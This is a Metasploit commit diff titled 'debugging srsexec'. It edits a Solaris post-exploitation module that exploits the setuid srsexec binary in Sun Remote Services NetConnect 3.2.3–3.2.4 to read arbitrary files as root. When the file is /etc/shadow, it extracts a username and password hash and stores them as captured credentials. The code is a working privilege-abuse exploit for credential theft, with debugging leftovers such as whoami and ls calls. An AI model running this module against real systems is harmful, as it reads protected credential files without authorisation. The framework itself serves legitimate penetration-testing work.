4bb16f96a779626332b09a5d01ba2e715c9d4669
h00die <michaeltcyr@gmail.com>
2018-09-11 22:06:03 -0400

    debugging srsexec

--- modules/post/solaris/gather/srsexec_readline.rb
+++ modules/post/solaris/gather/srsexec_readline.rb
@@ -34,34 +34,48 @@ class MetasploitModule < Msf::Post
 
   end
 
+  def suid_bin_path
+    '/opt/SUNWsrspx/bin/srsexec'
+  end
+
   def check
     # This ls is based on the guidance in the sun alerts article
-    # XXX need to full path ls
-    uninstallers = cmd_exec('ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh')
-    version = /UninstallNetConnect\.([\d\.]{11})\.sh/ =~ uninstallers
+    unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
+    # XXX the following three lines are for error checking and should be removed
+    print_status(unin)
+    print_status(cmd_exec 'ls /')
+    print_status(cmd_exec 'whoami')
+    version = unin.match(/UninstallNetConnect\.([\d\.]{11})\.sh/)
     unless version
       print_error 'NetConnect uninstall not found, either not installed or too new'
-      return CheckCode::Safe
+      return false
     end
+
+    unless setuid? suid_bin_path
+      vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
+      return false
+    end
+
     version = Gem::Version.new(version.split(".").map(&:to_i).join('.'))
     if version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
       print_good "#{version} is vulnerable"
-      return CheckCode::Detected
+      return true
     end
-    CheckCode::Safe
-  end
+    print_error "#{version} is not vulnerable"
+    false
 
-  def run
     if is_root?
       fail_with Failure::BadConfig, 'Session already has root privileges'
     end
+  end
 
-    if check != CheckCode::Detected
+  def run
+    unless check
       fail_with Failure::NotVulnerable, 'Target is not vulnerable'
     end
 
-    flag = rand_text_alpha rand(5..7)
-    output = cmd_exec("/opt/SUNWsrspx/bin/srsexec -dvb #{datstore['FILE']} #{flag}")
+    flag = 'foobar'
+    output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
     vprint_good(output)
     if datastore['FILE'] == '/etc/shadow'
       formatted_output = ''
@@ -72,15 +86,18 @@ class MetasploitModule < Msf::Post
           formatted_output = line
         end
       }
-      credential_data = {
-        address: thost,
-        workspace_id: myworkspace.id,
-        module_fullname: self.fullname,
-        username: formatted_output.split(':')[0],
-        private_data: formatted_output.split(':')[1],
-        private_type: :nonreplayable_hash
-      }
-      create_credential(credential_data)
+      unless formatted_output.empty?
+        credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          workspace_id: myworkspace.id,
+          module_fullname: self.fullname,
+          username: formatted_output.split(':')[0],
+          private_data: formatted_output.split(':')[1],
+          private_type: :nonreplayable_hash
+        }
+        create_credential(credential_data)
+      end
     end
 
   end
